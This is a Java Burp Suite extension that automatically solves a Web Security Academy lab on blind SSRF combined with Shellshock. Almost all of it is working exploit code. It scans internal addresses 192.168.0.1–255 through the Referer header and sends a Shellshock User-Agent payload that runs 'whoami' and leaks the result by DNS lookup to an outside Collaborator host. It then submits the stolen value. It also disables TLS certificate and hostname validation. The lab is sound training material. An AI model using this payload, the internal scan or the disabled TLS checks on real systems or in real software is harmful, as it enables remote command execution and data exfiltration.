package labSolver;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.Interaction;

import java.net.CookieHandler;
import java.net.CookieManager;
import java.io.IOException;
import java.net.URL;
import java.net.HttpURLConnection;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.net.URLEncoder;
import java.io.OutputStream;
import java.util.List;
import java.nio.charset.StandardCharsets;
import java.net.Proxy;
import java.net.InetSocketAddress;
import java.security.cert.X509Certificate;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;


public class LabSolver implements BurpExtension {
    private MontoyaApi api;
    private String labUrl;
    private String payload;
    private String solution;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.labUrl = "https://0aff009c03a735f4835882f6003100ae.web-security-academy.net/";
        CookieHandler.setDefault(new CookieManager());

        api.extension().setName("Lab: Blind SSRF with Shellshock exploitation");

        CollaboratorClient collaboratorClient = createCollaboratorClient();
        String payload = collaboratorClient.generatePayload().toString();

        try {
            sendRequest(payload);
        } catch (IOException e) {
            e.printStackTrace();
            api.logging().logToOutput("Error: " + e.getMessage());
        }

        List<Interaction> interactionList = collaboratorClient.getAllInteractions();
        printExfiltratedData(interactionList);
        api.logging().logToOutput(this.solution);

        try {
            submitSolution();
        } catch (IOException e) {
            e.printStackTrace();
            api.logging().logToOutput("Error: " + e.getMessage());
        }

        api.extension().registerUnloadingHandler(() -> {
            api.logging().logToOutput("Extension unloading...");
        });
    }

    private CollaboratorClient createCollaboratorClient() {
        CollaboratorClient collaboratorClient;

        collaboratorClient = api.collaborator().createClient();

        return collaboratorClient;
    }

    private void disableSSLCertificateValidation() throws Exception {
        TrustManager[] trustAllCerts = new TrustManager[] {
                new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() { return null; }
                    public void checkClientTrusted(X509Certificate[] certs, String authType) { }
                    public void checkServerTrusted(X509Certificate[] certs, String authType) { }
                }
        };

        SSLContext sc = SSLContext.getInstance("SSL");
        sc.init(null, trustAllCerts, new java.security.SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

        HostnameVerifier allHostsValid = (hostname, session) -> true;
        HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
    }

    public void sendRequest(String payload) throws IOException {
        try {
            disableSSLCertificateValidation();
        } catch (Exception e) {
            throw new IOException("Failed to disable SSL certificate validation", e);
        }

        for (int i = 1; i <= 255; i++) {
            URL url = new URL(labUrl + "product?productId=1");

            Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("127.0.0.1", 8080));
            HttpURLConnection connection = (HttpURLConnection) url.openConnection(proxy);

            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "() { :; }; /usr/bin/nslookup $(whoami)." + payload);
            connection.setRequestProperty("Referer", "http://192.168.0." + i + ":8080");

            StringBuilder response = new StringBuilder();
            try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                String line;
                while ((line = in.readLine()) != null) {
                    response.append(line);
                }
            } catch (IOException e) {
                api.logging().logToOutput("Error during GET request to 192.168.0." + i + ": " + e.getMessage());
            }

            api.logging().logToOutput("Response Body for 192.168.0." + i + ": " + response.toString());
        }

        this.payload = payload;
    }

    private void printExfiltratedData(List<Interaction> interactionList) {
        for (Interaction interaction : interactionList) {
            if (interaction.type().name().equalsIgnoreCase("dns")) {
                byte[] queryBytes = interaction.dnsDetails().get().query().getBytes();
                String dnsQuery = new String(queryBytes, StandardCharsets.UTF_8);
                String[] parts = payload.split("\\.");
                String[] dnsQueryParts = dnsQuery.split(parts[0]);
                this.solution = dnsQueryParts[0].substring(13, dnsQueryParts[0].length() - 1);
            }
            break;
        }
    }

    private void submitSolution() throws IOException {
        String data = "answer=" + solution.toString();
        URL url = new URL(labUrl + "submitSolution");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        connection.setRequestProperty("Content-Length", Integer.toString(data.length()));
        connection.setDoOutput(true);

        try (OutputStream os = connection.getOutputStream()) {
            os.write(data.getBytes());
            os.flush();
        }

        StringBuilder response = new StringBuilder();
        try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            String line;
            while ((line = in.readLine()) != null) {
                response.append(line);
            }
        }

        api.logging().logToOutput(solution);
        api.logging().logToOutput(response.toString());
    }
}
